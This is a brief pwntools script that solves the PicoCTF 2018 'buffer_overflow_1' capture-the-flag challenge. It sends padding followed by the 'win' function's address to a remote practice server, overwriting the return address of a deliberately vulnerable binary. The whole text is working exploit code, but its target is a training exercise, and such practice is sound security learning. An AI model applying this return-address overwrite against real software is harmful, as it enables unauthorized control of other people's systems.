from pwn import*
elf=ELF('./PicoCTF_2018_buffer_overflow_1')
p=remote('node4.buuoj.cn',25335)
#p=process('./PicoCTF_2018_buffer_overflow_1')
win=elf.symbols['win']
payload=b'a'*(0x28+4)+p32(win)
p.sendline(payload)

p.interactive()
